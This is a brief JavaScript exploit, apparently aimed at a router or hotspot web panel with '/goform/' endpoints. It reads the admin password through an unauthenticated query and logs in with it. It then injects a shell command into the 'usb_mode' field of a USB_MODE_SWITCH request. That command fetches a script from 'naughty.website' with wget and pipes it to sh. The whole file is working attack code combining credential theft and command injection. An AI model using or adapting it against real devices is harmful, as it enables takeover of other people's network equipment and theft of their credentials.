function get_cmd_process(cmd) {

	var ep = "/goform/goform_get_cmd_process?cmd=" + cmd + "&multi_data=0"

	xhr = new XMLHttpRequest();
	xhr.open("GET", ep, false);
	xhr.send();

	return xhr.response
}

function set_cmd_process(goformId, parameters){
	var ep = "/goform/goform_set_cmd_process?goformId=" + goformId + "&" + parameters
	
	xhr = new XMLHttpRequest();
	xhr.open("GET", ep, true);
	xhr.send();

	return xhr.response
}

var injection = "wget -O - http://naughty.website/test.sh | sh"

var leak_pass = get_cmd_process("admin_Password")
var password = JSON.parse(leak_pass).admin_Password

var b64pass = btoa(password)
set_cmd_process("LOGIN", "password=" + b64pass)

set_cmd_process("USB_MODE_SWITCH", "usb_mode=;" + injection + ";")

